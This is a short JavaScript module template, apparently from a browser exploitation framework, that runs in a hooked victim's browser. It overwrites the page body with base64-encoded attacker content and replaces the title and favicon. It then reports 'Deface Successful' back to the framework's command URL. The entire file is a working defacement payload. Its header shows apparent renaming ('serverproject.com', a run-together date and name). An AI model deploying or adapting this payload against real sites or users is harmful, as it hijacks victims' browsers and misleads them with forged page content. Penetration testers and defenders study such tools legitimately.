//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
	document.body.innerHTML = decodeURIComponent(server.encode.base64.decode('<%= Base64.strict_encode64(@deface_content) %>'));
	document.title = "<%= @deface_title %>";
	server.browser.changeFavicon("<%= @deface_favicon %>");

    server.net.send("<%= @command_url %>", <%= @command_id %>, "result=Deface Successful", server.are.status_success());
});
